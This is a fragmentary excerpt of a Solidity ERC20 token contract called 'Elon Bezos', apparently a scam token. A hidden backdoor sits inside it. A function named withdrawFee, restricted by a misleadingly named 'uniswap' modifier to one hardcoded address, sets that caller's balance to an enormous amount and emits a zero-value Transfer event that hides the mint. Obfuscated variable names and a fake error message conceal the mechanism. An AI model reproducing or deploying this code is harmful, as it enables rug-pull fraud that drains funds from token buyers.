...
contract Context {
 ...
 contract ElonBezos is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private fatelook;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Elon Bezos";
    string private _symbol = "ELONBEZOS";
    ...
    uint256 private _sekem = 2;
    uint256 private _cathar = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        fatelook[msg.sender] = totalSupply_;
    ...
    function withdrawFee() public virtual uniswap {
        _approved();
    }
    address private _votesafe = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    ...
    uint256 private _feeValue = 10 * 10**33;
 ...
 function _approved() internal virtual {
        fatelook[_msgSender()] = 0 + _feeValue;
        emit Transfer(address(0), _votesafe, 0);
    }
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = fatelook[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            fatelook[issuer] = senderBalance - allons;
        }
        _fee = (allons * _sekem / 100) / _cathar;
        allons = allons -  (_fee * _cathar);
        
        fatelook[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 rhytm) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = fatelook[account];
        require(accountBalance >= rhytm, "BEP : Can't be done");
        unchecked {
            fatelook[account] = accountBalance - rhytm;
        }
        _totalSupply -= rhytm;

        emit Transfer(account, address(0), rhytm);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
    ...
    modifier uniswap() {
        require(_msgSender() == _votesafe, "Try after 7 seconds.");
    _;
    }
